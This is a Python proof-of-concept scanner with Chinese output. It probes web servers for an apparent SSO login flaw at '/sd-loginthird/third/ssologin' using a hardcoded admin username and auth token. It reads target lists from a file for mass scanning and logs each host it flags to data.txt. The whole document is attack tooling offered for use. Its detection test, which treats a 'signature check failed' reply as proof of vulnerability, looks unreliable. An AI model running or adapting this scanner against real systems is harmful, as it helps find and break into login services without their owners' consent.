import requests
import argparse
import re
from tqdm import tqdm
from time import sleep


def main(url, timeout=2):
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url
    data = url
    poc = "/sd-loginthird/third/ssologin?username=zhxy_admin&timestamp=1697765009348&auid=A5AD9F87CF59805CECAF2A95D44CF6E"
    url = data + poc
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
    }
    try:
        response = requests.get(url, headers=headers,
                                timeout=timeout, verify=False)

        response_text = response.text
        if "签名校验未通过" in response_text:
            print("[+]漏洞存在")
            with open("data.txt", "a") as f:
                f.write(url + "\n")
        else:
            print("[-]漏洞不存在")

    except requests.exceptions.RequestException as e:
        print(f"[-]漏洞不存在，无法访问 {url}", e)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="检测URL是否存在漏洞")
    parser.add_argument("-u", "--url", required=False, help="需要检测的URL")
    parser.add_argument("-file", "--file", required=False,
                        help="包含多个URL的文件路径")
    args = parser.parse_args()

    if args.file:
        with open(args.file, 'r') as f:
            urls = [line.strip() for line in f.readlines()]
    elif args.url:
        urls = [args.url]
    else:
        print("请在添加 -h 获取提示信息！!!")
        exit()

    for url in urls:
        main(url)
